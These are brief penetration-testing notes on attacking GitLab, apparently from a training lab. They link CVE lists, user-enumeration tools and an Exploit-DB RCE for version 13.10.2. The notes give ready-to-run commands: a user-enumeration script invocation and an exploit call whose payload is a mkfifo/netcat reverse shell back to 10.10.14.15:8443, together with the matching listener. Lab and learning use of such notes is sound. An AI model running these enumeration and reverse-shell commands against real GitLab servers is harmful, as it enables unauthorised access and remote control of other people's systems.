CVEs: https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html

## User Enumeration

- https://github.com/dpgg101/GitLabUserEnum
- https://www.exploit-db.com/exploits/49821

Login attempt configuration: https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/8_devise.rb

```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```


## Authenticated Remote Code Execution

RCE: https://hackerone.com/reports/1154542 (Version 13.10.2)
- https://www.exploit-db.com/exploits/49951
```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
nc -lnvp 8443
```

